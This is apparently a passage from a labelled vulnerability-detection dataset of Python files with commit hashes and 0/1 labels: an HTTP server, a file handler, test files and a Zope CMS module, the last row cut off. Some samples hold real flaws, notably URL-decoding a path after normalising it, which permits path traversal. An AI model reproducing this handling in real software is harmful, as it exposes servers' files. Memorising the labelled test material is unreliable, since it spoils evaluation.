            orig_sigint = signal.signal(signal.SIGINT, signal.SIG_IGN)
            self.sync = multiprocessing.Manager()
            signal.signal(signal.SIGINT, orig_sigint)

        self.namespace = self.sync.Namespace()

        # processes and flags
        self.server_process = None
        self.namespace.server_shutdown = False
        self.namespace.manager_shutdown = False
        self.namespace.worker_shutdown = None

        # request queue for worker processes
        self.requests_lock = self.sync.Lock()
        self.requests = self.sync.Value('Q', 0)
        self.cur_processes_lock = self.sync.Lock()
        self.cur_processes = self.sync.Value('Q', 0)

        # lock for atomic handling of resources
        self.res_lock = ResLock(self.sync)

        # create the logs
        if log:
            self.log = log
        else:
            self.log = logging.getLogger('web')

            handler = logging.StreamHandler(sys.stderr)
            self.log.addHandler(handler)
            self.log.setLevel(logging.WARNING)

        if http_log:
            self.http_log = http_log
        else:
            self.http_log = logging.getLogger('http')

            handler = logging.StreamHandler(sys.stdout)
            handler.setFormatter(HTTPLogFormatter())
            self.http_log.addHandler(handler)
            self.http_log.addFilter(HTTPLogFilter())
            self.http_log.setLevel(logging.INFO)

        # prepare a TCPServer
        socketserver.TCPServer.__init__(self, address, None)

        # prepare SSL
        if self.keyfile and self.certfile:
            self.socket = ssl.wrap_socket(self.socket, keyfile, certfile, server_side=True)
            self.log.info('Socket encrypted with TLS')

    def close(self, timeout=None):
        if self.is_running():
            self.stop(timeout)

        self.server_close()

    def start(self):
        if self.is_running():
            return

        self.server_process = multiprocessing.Process(target=self.serve_forever, name='http-server')
        self.server_process.start()

        self.log.info('Server started')

    def stop(self, timeout=None):
        if not self.is_running():
            return

        self.shutdown()
        self.server_process.join(timeout)

        self.namespace.server_shutdown = False
        self.server_process = None

        self.log.info('Server stopped')

    def is_running(self):
        return bool(self.server_process and self.server_process.is_alive())

    def join(self, timeout=None):
        self.server_process.join(timeout)

    def server_bind(self):
        socketserver.TCPServer.server_bind(self)

        host, port = self.server_address[:2]
        self.log.info('Serving HTTP on ' + host + ':' + str(port))

    def process_request(self, connection, client_address):
        # create a new HTTPRequest and put it on the queue (handler, keepalive, initial_timeout, handled)
        self.request_queue.put((HTTPRequest(connection, client_address, self, self.request_timeout), (self.keepalive_timeout is not None), None, True))

    def handle_error(self, connection, client_address):
        self.log.exception('Connection Error')

    def serve_forever(self):
        # ignore SIGINT
        signal.signal(signal.SIGINT, signal.SIG_IGN)

        # set socket to non-blocking
        self.socket.setblocking(False)

        # create condition to signal ready connections
        self.connection_ready = self.sync.Condition()

        # create the worker manager process that will handle the workers and their dynamic growth
        self.manager_process = multiprocessing.Process(target=self.manager, name='http-manager')
        self.manager_process.start()

        # select self
        with selectors.DefaultSelector() as selector:
            selector.register(self, selectors.EVENT_READ)

            while not self.namespace.server_shutdown:
                # wait for connection
                for connection in selector.select(self.poll_interval):
                    notified = False
                    while not notified:
                        try:
                            # try to notify workers
                            with self.connection_ready:
                                self.connection_ready.notify()
                            notified = True
                        except RuntimeError:
                            time.sleep(self.poll_interval/(self.cur_processes.value + 1))

        # wait for manager process to quit
        self.namespace.manager_shutdown = True
        self.manager_process.join()

        self.namespace.manager_shutdown = False
        self.manager_process = None

        # clean up resource lock
        self.res_lock.clean()

    def shutdown(self):
        self.namespace.server_shutdown = True

    def manager(self):
        try:
            # create each worker process and store it in a list
            self.worker_processes = []
            with self.cur_processes_lock:
                self.cur_processes.value = 0
            for i in range(self.num_processes):
                process = multiprocessing.Process(target=self.worker, name='http-worker', args=(i,))
                self.worker_processes.append(process)
                with self.cur_processes_lock:
                    self.cur_processes.value += 1
                process.start()

            # manage the workers and queue
            while not self.namespace.manager_shutdown:
                # make sure all processes are alive and restart dead ones
                for i, process in enumerate(self.worker_processes):
                    if not process.is_alive():
                        self.log.warning('Worker ' + str(i) + ' died and another is starting in its place')
                        process = multiprocessing.Process(target=self.worker, name='http-worker', args=(i,))
                        self.worker_processes[i] = process
                        process.start()

                # if dynamic scaling enabled
                if self.max_queue:
                    # if we hit the max queue size, increase processes if not at max or max is None
                    if self.requests.value >= self.max_queue and (not self.max_processes or len(self.worker_processes) < self.max_processes):
                        process = multiprocessing.Process(target=self.worker, name='http-worker', args=(len(self.worker_processes),))
                        self.worker_processes.append(process)
                        with self.cur_processes_lock:
                            self.cur_processes.value += 1
                        process.start()
                    # if we are above normal process size, stop one if queue is free again
                    elif len(self.worker_processes) > self.num_processes and self.requests.value == 0:
                        self.namespace.worker_shutdown = len(self.worker_processes) - 1
                        self.worker_processes.pop().join()
                        with self.cur_processes_lock:
                            self.cur_processes.value -= 1
                        self.namespace.worker_shutdown = None

                time.sleep(self.poll_interval)
        finally:
            # tell all workers to shutdown
            self.namespace.worker_shutdown = -1

            # wait for each worker process to quit
            for process in self.worker_processes:
                process.join()

            self.namespace.worker_shutdown = None
            self.worker_processes = None
            with self.cur_processes_lock:
                self.cur_processes.value = 0

    def worker(self, num, request_queue=None):
        # create local queue for parsed requests
        self.request_queue = request_queue if request_queue is not None else queue.Queue()

        # loop over selector
        while self.namespace.worker_shutdown != -1 and self.namespace.worker_shutdown != num:
            # wait for ready connection
            with self.connection_ready:
                if self.connection_ready.wait(self.poll_interval):
                    try:
                        # get the request
                        request, client_address = self.get_request()
                    except BlockingIOError:
                        # ignore lack of request
                        request, client_address = None, None
                    except OSError:
                        # bail on socket error
                        return
                else:
                    # ignore lack of request
                    request, client_address = None, None

            # verify and process request
            if request:
                if self.verify_request(request, client_address):
                    try:
                        self.process_request(request, client_address)

                        with self.requests_lock:
                            self.requests.value += 1
                    except Exception:
                        self.handle_error(request, client_address)
                        self.shutdown_request(request)
                else:
                    self.shutdown_request(request)

            try:
                # get next request
                handler, keepalive, initial_timeout, handled = self.request_queue.get_nowait()
            except queue.Empty:
                # continue loop to check for shutdown and try again
                continue

            # if this request not previously handled, wait a bit for resource to become free
            if not handled:
                time.sleep(self.poll_interval)

            # handle request
            try:
                handled = handler.handle(keepalive, initial_timeout)
            except Exception:
                handled = True
                handler.keepalive = False
                self.log.exception('Request Handling Error')

            if not handled:
                # finish handling later
                self.request_queue.put((handler, keepalive, initial_timeout, False))

                with self.requests_lock:
                    self.requests.value += 1
            elif handler.keepalive:
                # handle again later
                self.request_queue.put((handler, keepalive, self.keepalive_timeout, True))

                with self.requests_lock:
                    self.requests.value += 1
            else:
                # close handler and request
                handler.close()
                self.shutdown_request(handler.connection)

            # mark task as done
            self.request_queue.task_done()

            with self.requests_lock:
                self.requests.value -= 1
/n/n/n",0
63,80202a6d3788ad1212a162d19785c600025e6aa4,"/fooster/web/file.py/n/nimport collections
import mimetypes
import os
import re
import shutil
import urllib.parse

from fooster import web


def normpath(path):
    old_path = path.split('/')
    new_path = collections.deque()

    for entry in old_path:
        # ignore empty paths - A//B -> A/B
        if not entry:
            continue
        # ignore dots - A/./B -> A/B
        elif entry == '.':
            continue
        # go back a level by popping the last directory off (if there is one) - A/foo/../B -> A/B
        elif entry == '..':
            if len(new_path) > 0:
                new_path.pop()
        else:
            new_path.append(entry)

    # special case for leading slashes
    if old_path[0] == '':
        new_path.appendleft('')

    # special case for trailing slashes
    if old_path[-1] == '':
        new_path.append('')

    return '/'.join(new_path)


class FileHandler(web.HTTPHandler):
    filename = None
    dir_index = False

    def index(self):
        # magic for stringing together everything in the directory with a newline and adding a / at the end for directories
        return ''.join(filename + '/\n' if os.path.isdir(os.path.join(self.filename, filename)) else filename + '\n' for filename in os.listdir(self.filename))

    def get_body(self):
        return False

    def do_get(self):
        try:
            if os.path.isdir(self.filename):
                # if necessary, redirect to add trailing slash
                if not self.filename.endswith('/'):
                    self.response.headers.set('Location', self.request.resource + '/')

                    return 307, ''

                # check for index file
                index = self.filename + 'index.html'
                if os.path.exists(index) and os.path.isfile(index):
                    indexfile = open(index, 'rb')
                    self.response.headers.set('Content-Type', 'text/html')
                    self.response.headers.set('Content-Length', str(os.path.getsize(index)))

                    return 200, indexfile
                elif self.dir_index:
                    # if no index and directory indexing enabled, send a generated one
                    return 200, self.index()
                else:
                    raise web.HTTPError(403)
            else:
                file = open(self.filename, 'rb')

                # get file size from metadata
                size = os.path.getsize(self.filename)
                length = size

                # HTTP status that changes if partial data is sent
                status = 200

                # handle range header and modify file pointer and content length as necessary
                range_header = self.request.headers.get('Range')
                if range_header:
                    range_match = re.match('bytes=(\d+)-(\d+)?', range_header)
                    if range_match:
                        # get lower and upper bounds
                        lower = int(range_match.group(1))
                        if range_match.group(2):
                            upper = int(range_match.group(2))
                        else:
                            upper = size - 1

                        # sanity checks
                        if upper < size and upper >= lower:
                            file.seek(lower)
                            self.response.headers.set('Content-Range', 'bytes ' + str(lower) + '-' + str(upper) + '/' + str(size))
                            length = upper - lower + 1
                            status = 206

                self.response.headers.set('Content-Length', str(length))

                # tell client we allow selecting ranges of bytes
                self.response.headers.set('Accept-Ranges', 'bytes')

                # guess MIME by extension
                mime = mimetypes.guess_type(self.filename)[0]
                if mime:
                    self.response.headers.set('Content-Type', mime)

                return status, file
        except FileNotFoundError:
            raise web.HTTPError(404)
        except NotADirectoryError:
            raise web.HTTPError(404)
        except OSError:
            raise web.HTTPError(403)


class ModifyMixIn:
    def do_put(self):
        try:
            # make sure directories are there (including the given one if not given a file)
            os.makedirs(os.path.dirname(self.filename), exist_ok=True)

            # send a 100 continue if expected
            if self.request.headers.get('Expect') == '100-continue':
                self.check_continue()
                self.response.wfile.write((web.http_version + ' 100 ' + web.status_messages[100] + '\r\n\r\n').encode(web.http_encoding))
                self.response.wfile.flush()

            # open (possibly new) file and fill it with request body
            with open(self.filename, 'wb') as file:
                bytes_left = int(self.request.headers.get('Content-Length', '0'))
                while True:
                    chunk = self.request.rfile.read(min(bytes_left, web.stream_chunk_size))
                    if not chunk:
                        break
                    bytes_left -= len(chunk)
                    file.write(chunk)

            return 204, ''
        except OSError:
            raise web.HTTPError(403)

    def do_delete(self):
        try:
            if os.path.isdir(self.filename):
                # recursively remove directory
                shutil.rmtree(self.filename)
            else:
                # remove single file
                os.remove(self.filename)

            return 204, ''
        except FileNotFoundError:
            raise web.HTTPError(404)
        except OSError:
            raise web.HTTPError(403)


class ModifyFileHandler(ModifyMixIn, FileHandler):
    pass


def new(local, remote='', dir_index=False, modify=False, handler=FileHandler):
    # remove trailing slashes if necessary
    if local.endswith('/'):
        local = local[:-1]
    if remote.endswith('/'):
        remote = remote[:-1]

    # set the appropriate inheritance whether modification is allowed
    if modify:
        inherit = ModifyMixIn, handler
    else:
        inherit = handler,

    # create a file handler for routes
    class GenFileHandler(*inherit):
        def respond(self):
            norm_request = normpath(self.groups['path'])
            if self.groups['path'] != norm_request:
                self.response.headers.set('Location', self.remote + norm_request)

                return 307, ''

            self.filename = self.local + urllib.parse.unquote(self.groups['path'])

            return handler.respond(self)

    GenFileHandler.local = local
    GenFileHandler.remote = remote
    GenFileHandler.dir_index = dir_index

    return {remote + '(?P<path>|/[^?#]*)(?P<query>[?#].*)?': GenFileHandler}


if __name__ == '__main__':
    import signal

    from argparse import ArgumentParser

    parser = ArgumentParser(description='quickly serve up local files over HTTP')
    parser.add_argument('-a', '--address', default='', dest='address', help='address to serve HTTP on (default: \'\')')
    parser.add_argument('-p', '--port', default=8000, type=int, dest='port', help='port to serve HTTP on (default: 8000)')
    parser.add_argument('--no-index', action='store_false', default=True, dest='indexing', help='disable directory listings')
    parser.add_argument('--allow-modify', action='store_true', default=False, dest='modify', help='allow file and directory modifications using PUT and DELETE methods')
    parser.add_argument('local_dir', help='local directory to serve over HTTP')

    args = parser.parse_args()

    httpd = web.HTTPServer((args.address, args.port), new(args.local_dir, dir_index=args.indexing, modify=args.modify))
    httpd.start()

    signal.signal(signal.SIGINT, lambda signum, frame: httpd.close())

    httpd.join()
/n/n/n",1
64,656f459e53a177aeabfb96f00e6b8f4a28f87c98,"tests/test_bw2_disclosure.py/n/nimport os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (os.path.realpath(disclosure_file))

    assert os.path.isfile(disclosure_file)

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(disclosure_file)

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0
/n/n/n",0
65,656f459e53a177aeabfb96f00e6b8f4a28f87c98,"/tests/test_bw2_disclosure.py/n/nimport os
import brightway2 as bw2
from fixtures import *

from lca_disclosures.brightway2.disclosure import Bw2Disclosure as DisclosureExporter
from lca_disclosures.brightway2.importer import DisclosureImporter

def test_attributes():

    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    assert de.foreground_flows
    assert de.background_flows
    assert de.emission_flows
    assert de.Af
    assert de.Ad
    assert de.Bf
    assert de.cutoffs


def test_bw2_disclosure():
    
    de = DisclosureExporter(TEST_BW_PROJECT_NAME, TEST_BW_DB_NAME, folder_path=TEST_FOLDER, filename=TEST_FILENAME)

    disclosure_file = de.write_json()

    print (disclosure_file)

    assert os.path.isfile(disclosure_file)

def test_bw2_import():

    bw2.projects.set_current(IMPORT_PROJECT_NAME)

    di = DisclosureImporter(os.path.join(os.path.dirname(os.path.realpath(__file__)), TEST_FOLDER, ""{}.json"".format(TEST_FILENAME)))

    di.apply_strategies()

    assert di.statistics()[2] == 0

    di.write_database()

    assert len(bw2.Database(di.db_name)) != 0
/n/n/n",1
66,3f28620d475220dfdb06f79787158ac50727c61a,"ZMSItem.py/n/n################################################################################
# ZMSItem.py
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from DateTime.DateTime import DateTime
from Products.PageTemplates.PageTemplateFile import PageTemplateFile
from Persistence import Persistent
from Acquisition import Implicit
import OFS.SimpleItem, OFS.ObjectManager
import zope.interface
# Product Imports.
import IZMSDaemon


################################################################################
################################################################################
###
###   Abstract Class ZMSItem
###
################################################################################
################################################################################
class ZMSItem(
    OFS.ObjectManager.ObjectManager,
    OFS.SimpleItem.Item,
    Persistent,  # Persistent.
    Implicit,    # Acquisition.
    ):

    # Documentation string.
    __doc__ = """"""ZMS product module.""""""
    # Version string. 
    __version__ = '0.1' 
    
    # Management Permissions.
    # -----------------------
    __authorPermissions__ = (
      'manage_page_header', 'manage_page_footer', 'manage_tabs', 'manage_main_iframe' 
      )
    __viewPermissions__ = (
      'manage_menu',
      )
    __ac_permissions__=(
      ('ZMS Author', __authorPermissions__),
      ('View', __viewPermissions__),
      )

    # Templates.
    # ----------
    manage = PageTemplateFile('zpt/object/manage', globals())
    manage_workspace = PageTemplateFile('zpt/object/manage', globals())
    manage_main = PageTemplateFile('zpt/ZMSObject/manage_main', globals())
    manage_main_iframe = PageTemplateFile('zpt/ZMSObject/manage_main_iframe', globals())

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_body_content:
    # --------------------------------------------------------------------------
    def zmi_body_content(self, *args, **kwargs):
      request = self.REQUEST
      response = request.RESPONSE
      return self.getBodyContent(request)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_css:
    # --------------------------------------------------------------------------
    def zmi_manage_css(self, *args, **kwargs):
      """""" ZMSItem.zmi_manage_css """"""
      request = self.REQUEST
      response = request.RESPONSE
      response.setHeader('Content-Type','text/css')
      css = []
      for stylesheet in self.getStylesheets():
        try:
          s = stylesheet(self)
        except:
          s = str(stylesheet)
        css.append(""/* ######################################################################"")
        css.append(""   ### %s""%stylesheet.absolute_url())
        css.append(""   ###################################################################### */"")
        css.append(s)
      return '\n'.join(css)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_menu:
    # --------------------------------------------------------------------------
    def zmi_manage_menu(self, *args, **kwargs):
      return self.manage_menu(args,kwargs)

    # --------------------------------------------------------------------------
    #  zmi_body_attrs:
    # --------------------------------------------------------------------------
    def zmi_body_class(self, *args, **kwargs):
      request = self.REQUEST
      l = ['zmi']
      l.append(request['lang'])
      l.extend(map(lambda x:kwargs[x],kwargs.keys()))
      l.append(self.meta_id)
      # FOR EVALUATION: adding node specific css classes [list]
      internal_dict = self.attr('internal_dict')
      if isinstance(internal_dict,dict) and internal_dict.get('css_classes',None):
        l.extend( internal_dict['css_classes'] )
      l.extend(request['AUTHENTICATED_USER'].getRolesInContext(self))
      return ' '.join(l)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_page_request:
    # --------------------------------------------------------------------------
    def _zmi_page_request(self, *args, **kwargs):
      for daemon in filter(lambda x:IZMSDaemon.IZMSDaemon in list(zope.interface.providedBy(x)),self.getDocumentElement().objectValues()):
        daemon.startDaemon()
      request = self.REQUEST
      request.set( 'ZMS_THIS',self.getSelf())
      request.set( 'ZMS_DOCELMNT',self.breadcrumbs_obj_path()[0])
      request.set( 'ZMS_ROOT',request['ZMS_DOCELMNT'].absolute_url())
      request.set( 'ZMS_COMMON',getattr(self,'common',self.getHome()).absolute_url())
      request.set( 'ZMI_TIME',DateTime().timeTime())
      request.set( 'ZMS_CHARSET',request.get('ZMS_CHARSET','utf-8'))
      if not request.get('HTTP_ACCEPT_CHARSET'):
        request.set('HTTP_ACCEPT_CHARSET','%s;q=0.7,*;q=0.7'%request['ZMS_CHARSET'])
      if (request.get('ZMS_PATHCROPPING',False) or self.getConfProperty('ZMS.pathcropping',0)==1) and request.get('export_format','')=='':
        base = request.get('BASE0','')
        if request['ZMS_ROOT'].startswith(base):
          request.set( 'ZMS_ROOT',request['ZMS_ROOT'][len(base):])
          request.set( 'ZMS_COMMON',request['ZMS_COMMON'][len(base):])
    
    def zmi_page_request(self, *args, **kwargs):
      request = self.REQUEST
      RESPONSE = request.RESPONSE
      SESSION = request.SESSION
      self._zmi_page_request()
      RESPONSE.setHeader('Expires',DateTime(request['ZMI_TIME']-10000).toZone('GMT+1').rfc822())
      RESPONSE.setHeader('Cache-Control', 'no-cache')
      RESPONSE.setHeader('Pragma', 'no-cache')
      RESPONSE.setHeader('Content-Type', 'text/html;charset=%s'%request['ZMS_CHARSET'])
      if not request.get( 'preview'):
        request.set( 'preview','preview')
      langs = self.getLanguages(request)
      if request.get('lang') not in langs:
        request.set('lang',langs[0])
      if request.get('manage_lang') not in self.getLocale().get_manage_langs():
        request.set('manage_lang',self.get_manage_lang())
      if not request.get('manage_tabs_message'):
        request.set( 'manage_tabs_message',self.getConfProperty('ZMS.manage_tabs_message',''))
      # manage_system
      if request.form.has_key('zmi-manage-system'):
        request.SESSION.set('zmi-manage-system',int(request.get('zmi-manage-system')))
      # avoid declarative urls
      physical_path = self.getPhysicalPath()
      path_to_handle = request['URL0'][len(request['BASE0']):].split('/')
      path = path_to_handle[:-1]
      if self.getDocumentElement().id in path and len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:
        for i in range(len(path)):
          if path[:-(i+1)] != physical_path[:-(i+1)]:
            path[:-(i+1)] = physical_path[:-(i+1)]
        new_path = path+[path_to_handle[-1]]
        if path_to_handle != new_path:
          request.RESPONSE.redirect('/'.join(new_path))

    def f_standard_html_request(self, *args, **kwargs):
      request = self.REQUEST
      self._zmi_page_request()
      if not request.get( 'lang'):
        request.set( 'lang',self.getLanguage(request))
      if not request.get('manage_lang') in self.getLocale().get_manage_langs():
        request.set( 'manage_lang',self.get_manage_lang())


    # --------------------------------------------------------------------------
    #  ZMSItem.display_icon:
    #
    #  @param REQUEST
    # --------------------------------------------------------------------------
    def display_icon(self, REQUEST, meta_type=None, key='icon', zpt=None):
      if meta_type is None:
        return self.icon
      else:
        return self.aq_parent.display_icon( REQUEST, meta_type, key, zpt)


    # --------------------------------------------------------------------------
    #  ZMSItem.getTitlealt
    # --------------------------------------------------------------------------
    def getTitlealt( self, REQUEST):
      return self.getZMILangStr( self.meta_type)


    # --------------------------------------------------------------------------
    #  ZMSItem.breadcrumbs_obj_path:
    # --------------------------------------------------------------------------
    def breadcrumbs_obj_path(self, portalMaster=True):
      return self.aq_parent.breadcrumbs_obj_path(portalMaster)

################################################################################/n/n/n",0
67,3f28620d475220dfdb06f79787158ac50727c61a,"/ZMSItem.py/n/n################################################################################
# ZMSItem.py
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from DateTime.DateTime import DateTime
from Products.PageTemplates.PageTemplateFile import PageTemplateFile
from Persistence import Persistent
from Acquisition import Implicit
import OFS.SimpleItem, OFS.ObjectManager
import zope.interface
# Product Imports.
import IZMSDaemon


################################################################################
################################################################################
###
###   Abstract Class ZMSItem
###
################################################################################
################################################################################
class ZMSItem(
    OFS.ObjectManager.ObjectManager,
    OFS.SimpleItem.Item,
    Persistent,  # Persistent.
    Implicit,    # Acquisition.
    ):

    # Documentation string.
    __doc__ = """"""ZMS product module.""""""
    # Version string. 
    __version__ = '0.1' 
    
    # Management Permissions.
    # -----------------------
    __authorPermissions__ = (
      'manage_page_header', 'manage_page_footer', 'manage_tabs', 'manage_main_iframe' 
      )
    __viewPermissions__ = (
      'manage_menu',
      )
    __ac_permissions__=(
      ('ZMS Author', __authorPermissions__),
      ('View', __viewPermissions__),
      )

    # Templates.
    # ----------
    manage = PageTemplateFile('zpt/object/manage', globals())
    manage_workspace = PageTemplateFile('zpt/object/manage', globals())
    manage_main = PageTemplateFile('zpt/ZMSObject/manage_main', globals())
    manage_main_iframe = PageTemplateFile('zpt/ZMSObject/manage_main_iframe', globals())

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_body_content:
    # --------------------------------------------------------------------------
    def zmi_body_content(self, *args, **kwargs):
      request = self.REQUEST
      response = request.RESPONSE
      return self.getBodyContent(request)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_css:
    # --------------------------------------------------------------------------
    def zmi_manage_css(self, *args, **kwargs):
      """""" ZMSItem.zmi_manage_css """"""
      request = self.REQUEST
      response = request.RESPONSE
      response.setHeader('Content-Type','text/css')
      css = []
      for stylesheet in self.getStylesheets():
        try:
          s = stylesheet(self)
        except:
          s = str(stylesheet)
        css.append(""/* ######################################################################"")
        css.append(""   ### %s""%stylesheet.absolute_url())
        css.append(""   ###################################################################### */"")
        css.append(s)
      return '\n'.join(css)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_manage_menu:
    # --------------------------------------------------------------------------
    def zmi_manage_menu(self, *args, **kwargs):
      return self.manage_menu(args,kwargs)

    # --------------------------------------------------------------------------
    #  zmi_body_attrs:
    # --------------------------------------------------------------------------
    def zmi_body_class(self, *args, **kwargs):
      request = self.REQUEST
      l = ['zmi']
      l.append(request['lang'])
      l.extend(map(lambda x:kwargs[x],kwargs.keys()))
      l.append(self.meta_id)
      # FOR EVALUATION: adding node specific css classes [list]
      internal_dict = self.attr('internal_dict')
      if isinstance(internal_dict,dict) and internal_dict.get('css_classes',None):
        l.extend( internal_dict['css_classes'] )
      l.extend(request['AUTHENTICATED_USER'].getRolesInContext(self))
      return ' '.join(l)

    # --------------------------------------------------------------------------
    #  ZMSItem.zmi_page_request:
    # --------------------------------------------------------------------------
    def _zmi_page_request(self, *args, **kwargs):
      for daemon in filter(lambda x:IZMSDaemon.IZMSDaemon in list(zope.interface.providedBy(x)),self.getDocumentElement().objectValues()):
        daemon.startDaemon()
      request = self.REQUEST
      request.set( 'ZMS_THIS',self.getSelf())
      request.set( 'ZMS_DOCELMNT',self.breadcrumbs_obj_path()[0])
      request.set( 'ZMS_ROOT',request['ZMS_DOCELMNT'].absolute_url())
      request.set( 'ZMS_COMMON',getattr(self,'common',self.getHome()).absolute_url())
      request.set( 'ZMI_TIME',DateTime().timeTime())
      request.set( 'ZMS_CHARSET',request.get('ZMS_CHARSET','utf-8'))
      if not request.get('HTTP_ACCEPT_CHARSET'):
        request.set('HTTP_ACCEPT_CHARSET','%s;q=0.7,*;q=0.7'%request['ZMS_CHARSET'])
      if (request.get('ZMS_PATHCROPPING',False) or self.getConfProperty('ZMS.pathcropping',0)==1) and request.get('export_format','')=='':
        base = request.get('BASE0','')
        if request['ZMS_ROOT'].startswith(base):
          request.set( 'ZMS_ROOT',request['ZMS_ROOT'][len(base):])
          request.set( 'ZMS_COMMON',request['ZMS_COMMON'][len(base):])
    
    def zmi_page_request(self, *args, **kwargs):
      request = self.REQUEST
      RESPONSE = request.RESPONSE
      SESSION = request.SESSION
      self._zmi_page_request()
      RESPONSE.setHeader('Expires',DateTime(request['ZMI_TIME']-10000).toZone('GMT+1').rfc822())
      RESPONSE.setHeader('Cache-Control', 'no-cache')
      RESPONSE.setHeader('Pragma', 'no-cache')
      RESPONSE.setHeader('Content-Type', 'text/html;charset=%s'%request['ZMS_CHARSET'])
      if not request.get( 'preview'):
        request.set( 'preview','preview')
      langs = self.getLanguages(request)
      if request.get('lang') not in langs:
        request.set('lang',langs[0])
      if request.get('manage_lang') not in self.getLocale().get_manage_langs():
        request.set('manage_lang',self.get_manage_lang())
      if not request.get('manage_tabs_message'):
        request.set( 'manage_tabs_message',self.getConfProperty('ZMS.manage_tabs_message',''))
      # manage_system
      if request.form.has_key('zmi-manage-system'):
        request.SESSION.set('zmi-manage-system',int(request.get('zmi-manage-system')))
      # avoid declarative urls
      physical_path = self.getPhysicalPath()
      path_to_handle = request['URL0'][len(request['BASE0']):].split('/')
      path = path_to_handle[:-1]
      if len(filter(lambda x:x.find('.')>0 or x.startswith('manage_'),path))==0:
        for i in range(len(path)):
          if path[:-(i+1)] != physical_path[:-(i+1)]:
            path[:-(i+1)] = physical_path[:-(i+1)]
        new_path = path+[path_to_handle[-1]]
        if path_to_handle != new_path:
          request.RESPONSE.redirect('/'.join(new_path))

    def f_standard_html_request(self, *args, **kwargs):
      request = self.REQUEST
      self._zmi_page_request()
      if not request.get( 'lang'):
        request.set( 'lang',self.getLanguage(request))
      if not request.get('manage_lang') in self.getLocale().get_manage_langs():
        request.set( 'manage_lang',self.get_manage_lang())


    # --------------------------------------------------------------------------
    #  ZMSItem.display_icon:
    #
    #  @param REQUEST
    # --------------------------------------------------------------------------
    def display_icon(self, REQUEST, meta_type=None, key='icon', zpt=None):
      if meta_type is None:
        return self.icon
      else:
        return self.aq_parent.display_icon( REQUEST, meta_type, key, zpt)


    # --------------------------------------------------------------------------
    #  ZMSItem.getTitlealt
    # --------------------------------------------------------------------------
    def getTitlealt( self, REQUEST):
      return self.getZMILangStr( self.meta_type)


    # --------------------------------------------------------------------------
    #  ZMSItem.breadcrumbs_obj_path:
    # --------------------------------------------------------------------------
    def breadcrumbs_obj_path(self, portalMaster=True):
      return self.aq_parent.breadcrumbs_obj_path(portalMaster)

################################################################################/n/n/n",1
68,3f28620d475220dfdb06f79787158ac50727c61a,"ZMSItem.py/n/n################################################################################
# ZMSItem.py
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from DateTime.DateTime import DateTime
from Products.PageTemplates.PageTemplateFile import PageTemplateFile
from Persistence import Persistent
from Acquisition import Implicit
import OFS.SimpleItem, OFS.ObjectManager
import zope.interface
# Product Imports.
import IZMSDaemon


################################################################################
################################################################################
###
###   Abstract Class ZMSItem
###
################################################################################
################################################################################
class ZMSItem(
    OFS.ObjectManager.ObjectManager,
    OFS.SimpleItem.Item,
    Persistent,  # Persistent.
    Implicit,    # Acquisition.
    ):

    # Documentation string.
    __doc__ = """"""ZMS product module.""""""
    # Version string. 
    __version__ = '0.1' 
    
    # Management Permissions.
    # -----------------------
    __authorPermissions__ = (
      'manage_page_header', 'manage_page_footer', 'manage_tabs', 'manage_main_iframe' 
      )
    __viewPermissions__ = (
      'manage_menu',
      )
    __ac_permissions__=(
      ('ZMS Author', __authorPermissions__),
      ('View', __viewPermissions__),
      )

    # Templates.
    # ----------
    manage = PageTemplateFile('zpt/object/manage', globals())
    manage_workspace = PageTemplateFile('zpt/object/manage', globals())
    manage_main = PageTemplateFile('zpt/ZMSObject/manage_main', globals())
    manage_main_iframe = PageTemplateFile('zpt/ZMSObject/manage_main_iframe', globals())

    # --------------------------------------------------------------------------
